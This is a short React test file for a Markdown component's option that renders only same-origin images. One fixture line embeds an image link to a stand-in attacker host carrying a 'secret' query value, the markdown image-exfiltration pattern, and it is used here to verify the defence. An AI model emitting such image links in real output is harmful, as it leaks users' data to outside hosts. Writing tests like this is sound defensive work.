import { describe, expect, it } from 'vitest';
import { render, screen } from '@testing-library/react';
import { Markdown } from './Markdown';

describe('Markdown images', () => {
    const content = `![a chart](/images/chart.png)\n\n![leak](https://evil.example/x.png?q=secret)`;

    it('shows every image by default', () => {
        render(<Markdown content={content} />);
        expect(screen.getAllByRole('img')).toHaveLength(2);
    });

    it('shows only same-origin images when asked, keeping the description of the others', () => {
        render(<Markdown content={content} sameOriginImagesOnly />);
        const images = screen.getAllByRole('img');
        expect(images).toHaveLength(1);
        expect(images[0]).toHaveAttribute('src', '/images/chart.png');
        expect(screen.getByText('leak')).toBeInTheDocument();
        expect(document.querySelector('img[src^="https://evil"]')).toBeNull();
    });
});
